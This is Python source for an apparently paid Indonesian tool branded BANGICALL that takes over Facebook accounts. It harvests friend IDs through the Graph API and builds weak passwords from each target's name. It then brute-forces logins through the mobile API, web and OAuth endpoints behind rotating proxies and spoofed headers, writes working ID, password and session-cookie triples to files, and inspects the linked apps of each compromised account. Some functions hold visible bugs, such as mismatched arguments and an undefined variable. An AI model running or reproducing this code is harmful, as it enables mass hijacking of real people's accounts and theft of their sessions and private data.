				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idf}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r TOTAL ID TERKUMPUL : {len(id)}{P} "),
			sys.stdout.flush()
		dump(idf,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#<----------[ DEF-THN-RANDOM ]---------->#
def Sall_setting():
	for sall_ganteng in id:
			sall = random.randint(0,len(id1))
			id1.insert(sall,sall_ganteng)
	Sall_metod()
#<----------[ DEF-METHOD ]---------->#
def Sall_metod():
	print('')
	cetak(panel(f'[blue]01.[green]METHOD V1 \n[blue]02.[green]METHOD V2 \n[blue]03.[green]METHOD V3 ',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold purple"))
	ganteng_ = input(f' PILIH  : ')
	if ganteng_ in ['01','1']:
		kentod.append('valid')
	elif ganteng_ in ['02','2']:
		kentod.append('async')
	elif ganteng_ in ['03','3']:
		kentod.append('validaye')
	else:
		sall(f" MASUKAN HANYA ANGKA ")
		waktu(2)
		Sall_metod()
	cetak(panel(f'[blue]TAMBAH PASSWORD MANUAL ',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold purple"))
	passs = input(f' Y/t : ')
	if passs in ['y','Y']:
		pwkon.append('ya')
		paskon = input(f' MASUKAN PW MANUAL :  ')
		paslon = paskon.split(',')
		for _pw_ in paslon:
			pwnya.append(_pw_)
	else:
		pwkon.append('tidak')
		Faisal_pass()
#<----------[ DEF-WONDERLIST ]---------->#
def Faisal_pass():
	global prog,des,FaisalGanteng,GantengPoll
	cetak(panel(f'HASIL LIVE DI = {H}{oke}{P}\nHASIL CHEK DI = {K}{cpe}{P}\nMAINKAN MODE PESAWAT SETIAP 150/200 ID ',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold purple"))
	FaisalGanteng = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	GantengPoll = FaisalGanteng.add_task('',total=len(id))
	with FaisalGanteng:
		with tred(max_workers=30) as plongo:
			for mustika in id1:
				idf,nama = mustika.split('|')[0],mustika.split('|')[1].lower()
				depan = nama.split(' ')[0]
				pasat = ['kamunanya','kata sandi','kamu nanya']
				if len(nama)<6:
					if len(depan)<3:
						pass
					else:
						pasat.append(nama)
						pasat.append(depan+'321')
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'01')
						pasat.append(depan+'02')
						pasat.append(depan+'03')
						pasat.append(depan+'04')
						pasat.append(depan+'05')
						pasat.append(depan+'06')
						pasat.append(depan+'07')
						pasat.append(depan+'08')
						pasat.append(depan+'09')
						pasat.append(depan+'10')
						pasat.append(depan+'22')
				else:
					if len(depan)<3:
						pasat.append(nama)
					else:
						pasat.append(nama)
						pasat.append(depan+'321')
						pasat.append(depan+'123')
						pasat.append(depan+'1234')
						pasat.append(depan+'12345')
						pasat.append(depan+'123456')
						pasat.append(depan+'01')
						pasat.append(depan+'02')
						pasat.append(depan+'03')
						pasat.append(depan+'04')
						pasat.append(depan+'05')
						pasat.append(depan+'06')
						pasat.append(depan+'07')
						pasat.append(depan+'08')
						pasat.append(depan+'09')
						pasat.append(depan+'10')
						pasat.append(depan+'22')
				if 'at' in pwkon:
					for pwde in pwnya:
						pasat.append(pwde)
				else:pass
				if 'valid' in kentod:
					plongo.submit(validate,idf,pasat)
				elif 'async' in kentod:
					plongo.submit(asyncc,idf,pasat)
				elif 'validate' in kentod:
					plongo.submit(validate1,idf,pasat)
				else:
					plongo.submit(validate,idf,pasat)
		cetak(panel(f'SUKSES CRACK {B}{len(id1)}{P} ID,DENGAN JUMPLAH HASIL\nSALL-LIVE = {H}{ok} \nSALL-CHECK = {K}{cp}{P} ',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold purple"))
#<----------[ DEF-VALIDATE ]---------->#
def validate(idf,pasat,nama):
	global loop,ok,cp
	FaisalGanteng.update(GantengPoll,description=f' [BANGICAL] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHECK = [yellow]{(cp)}[white]]')
	FaisalGanteng.advance(GantengPoll)
	ua = Ical()
	ses = requests.Session()
	for pw in pasat:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			data = {
    'adid': str(uuid.uuid4()),
    'format': 'json',
    'device_id': str(uuid.uuid4()),
    'email': idf,
    'password': pw,
    'generate_analytics_claim': '1',
    'family_device_id': str(uuid.uuid4()),
    'generate_session_cookies': '1',
    'advertiser_id': str(uuid.uuid4()),
    'source': 'login',
    'method': 'auth.login',
    'locale': 'id_ID',
    'client_country_code': 'ID',
    'fb_api_req_friendly_name': 'authenticate',
    'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
    'api_key': '256002347743983',
    'access_token': '256002347743983|374e60f8b9bb6b8cbb30f78030438895',
}
			head = {'host': 'b-graph.facebook.com',
'x-fb-connection-quality': 'EXCELLENT',
'x-fb-sim-hni': '51001',
'x-fb-net-hni': '51001',
'user-agent': ua,
'content-type': 'application/x-www-form-urlencoded',
'x-fb-connection-type': 'MOBILE.LTE',
'accept-encoding': 'gzip, deflate',}
			url = "https://b-graph.facebook.com/auth/login"
			q = ses.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
			if "session_key" in q:
				os.system('espeak -a 300 " Akun,   Sukses,  Login"')
				kuki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
				tree = Tree("{H}AKUN BERHASIL LOGIN")
				tree.add(f"{P}ID USER {H}{idf}")
				tree.add(f"{P}TAHUN {H}{tahun(idf)}")
				tree.add(f"{P}PASSWORD {H}{pw}")
				tree.add(f"{P}COOKIES {H}{kuki}")
				cetak(tree)
				open('/sdcard/SALL-LIVE/'+oke,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif 'User must verify their account' in q['error']['message']:
				cp+=1
				os.system('espeak -a 300 " Checkpoint"')
				tree = Tree("{K}AKUN GAGAL LOGIN")
				tree.add(f"{P}TAHUN {M}{tahun(idf)}")
				tree.add(f"{P}ID USER {M}{idf}")
				tree.add(f"{P}PASSWORD {M}{pw}")
				tree.add(f"{P}USER-AGENT {M}{ua}")
				cetak(tree)
				open('/sdcard/SALL-CHECK/'+cpe,'a').write(idf+'|'+pw+'\n')
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#<----------[ DEF-ASYNC ]---------->#
def asyncc(idf,pasat):
	global loop,ok,cp
	FaisalGanteng.update(GantengPoll,description=f' [BANGICAL] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	FaisalGanteng.advance(GantengPoll)
	ua = Ical()
	ses = requests.Session()
	for pw in pasat:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get(f"https://web.facebook.com/?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd3f84f7-8f3e-4c94-8023-bd5d0b363e6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr")
			date = {
'jazoest':re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),
'lsd':re.search('name="lsd" value="(.*?)"',str(req1)).group(1),
'email': idf,
'pass': pw,
'next': 'https://web.facebook.com/?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd3f84f7-8f3e-4c94-8023-bd5d0b363e6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated',
'login_source': 'login_bluebar',
'prefill_contact_point': idf,
'prefill_source': 'browser_dropdown',
'prefill_type': 'contact_point'}
			head = {
'Host': 'web.facebook.com',
'content-length': f'{str(rr(599,3999))}',
'cache-control': 'max-age=0',
'sec-ch-ua': f'"Android WebView";v="{str(rr(85,450))}", "Not=A?Brand";v="{str(rr(1,150))}", "Chromium";v="{str(rr(85,450))}"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'origin': 'https://web.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'upgrade-insecure-requests': '1',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'x-requested-with': 'mark. lvia.gp',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': 'https://web.facebook.com/?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd3f84f7-8f3e-4c94-8023-bd5d0b363e6a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522otqtju14xwo9ysu06xw5e83g4d32r141egjqvt1r7n8c0t0eom7%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f"https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", headers=head, data=date, proxies=proxs, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				os.system('espeak -a 300 " Akun,   Checkpoint"')
				print(f'\r >>> {tahun(idf)}')
				print(f' >>> {M}{idf} | {M}{pw}')
				print(f' >>> {K}{ua}')
				open('/sdcard/SALL-CHECK/'+cpe,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				os.system('espeak -a 300 " Akun,  Sukses,  Login"')
				print(f'\r >>> {tahun(idf)}')
				print(f' >>> {H}{idf} | {H}{pw}')
				print(f' > {B}{kuki}')
				open('/sdcard/SALL-LIVE/'+oke,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#-------[DEF-VALIDATE]----#
def validate1(idf,pasat):
	global loop,ok,cp
	FaisalGanteng.update(GantengPoll,description=f' [BANGICAL] [{(loop)}/{len(id)}] [LIVE = [green]{(ok)}[white]] [CHEK = [yellow]{(cp)}[white]]')
	FaisalGanteng.advance(GantengPoll)
	ua = Ical()
	ses = requests.Session()
	for pw in pasat:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			p = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1727789258281%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1b980699a2fb2d8d%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff325b933d81c5962%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%26locale%3Den_US%26logger_id%3Df1b7d2acbc6f8c699%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd12cf4063fffbcba%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff325b933d81c5962%2526relation%253Dopener%2526frame%253Df93616e033a0ad8e9%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd12cf4063fffbcba%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff325b933d81c5962%26relation%3Dopener%26frame%3Df93616e033a0ad8e9%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={
'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 
'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 
'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 
'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1),
'try_number': '0', 
'unrecognized_tries': '0', 
'email': idf, 
'pass': pw, 
'prefill_contact_point': '', 
'prefill_source': '', 
'prefill_type': '', 
'first_prefill_source': '', 
'first_prefill_type': '', 
'had_cp_prefilled': 'false', 
'had_password_prefilled': 'false', 
'is_smart_lock': 'false', 
}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.600000023841858; wd=450x573'
			heade = {
			'Host': 'm.prod.facebook.com',
			'sec-ch-ua': f'"Not-A.Brand";v="{str(rr(75,555))}", "Chromium";v="{str(rr(100,555))}"',
			'sec-ch-ua-mobile': '?1',
			'user-agent': ua,
			'content-type': 'application/x-www-form-urlencoded',
			'sec-ch-ua-full-version-list': f'"Not-A.Brand";v="{str(rr(75,555))}.0.0.0", "Chromium";v="{str(rr(100,555))}.0.{str(rr(5000,9999))}.{str(rr(1,20))}"',
			'sec-ch-prefers-color-scheme': 'dark',
			'sec-ch-ua-platform': 'Android',
			'accept': '*/*',
			'origin': 'https://m.prod.facebook.com',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-dest': 'empty',
			'referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1727789258281%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1b980699a2fb2d8d%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff325b933d81c5962%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%26locale%3Den_US%26logger_id%3Df1b7d2acbc6f8c699%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd12cf4063fffbcba%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff325b933d81c5962%2526relation%253Dopener%2526frame%253Df93616e033a0ad8e9%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd12cf4063fffbcba%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff325b933d81c5962%26relation%3Dopener%26frame%3Df93616e033a0ad8e9%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    }
			po = ses.post('https://m.prod.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=22e378ae2d895281c6032ec30201f192&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1727789258281%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1b980699a2fb2d8d%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff325b933d81c5962%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%26locale%3Den_US%26logger_id%3Df1b7d2acbc6f8c699%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd12cf4063fffbcba%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff325b933d81c5962%2526relation%253Dopener%2526frame%253Df93616e033a0ad8e9%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfd12cf4063fffbcba%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff325b933d81c5962%26relation%3Dopener%26frame%3Df93616e033a0ad8e9%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,proxies=proxs,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				os.system('espeak -a 300 " Akun,   Checkpoint"')
				print(f'\r >>> {tahun(idf)}')
				print(f' >>> {M}{idf} | {M}{pw}')
				print(f' >>> {K}{ua}')
				open('/sdcard/SALL-CHECK/'+cpe,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				os.system('espeak -a 300 " Akun,  Sukses,  Login"')
				print(f'\r >>> {tahun(idf)}')
				print(f' >>> {H}{idf} | {H}{pw}')
				print(f' > {B}{kuki}')
				open('/sdcard/SALL-LIVE/'+oke,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#APK
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s\033[0;92m > %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\x1b[1;91m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s\033[0m< %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \x1b[1;91m cookie invalid"%(M))
		
#TAHUN
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz='2023-2024'
	elif len(fx) in [9,10]:tahunz = '2008'
	elif len(fx)==8:tahunz = '2007'
	elif len(fx)==7:tahunz = '2006'
	else:tahunz='2023-2024'
	return tahunz
#<----------[__MAIN__]------------->#
if __name__=='__main__':
	try:os.mkdir('/sdcard/SALL-LIVE')
	except:pass
	try:os.mkdir('/sdcard/SALL-CHECK')
	except:pass
	login_sal()
#SCRIPT NEW BANGICALL
#PREMIUM SCRIPT 
#25K 1 MINGGU
#45K 2 MINGGU
#65K 1 BULAN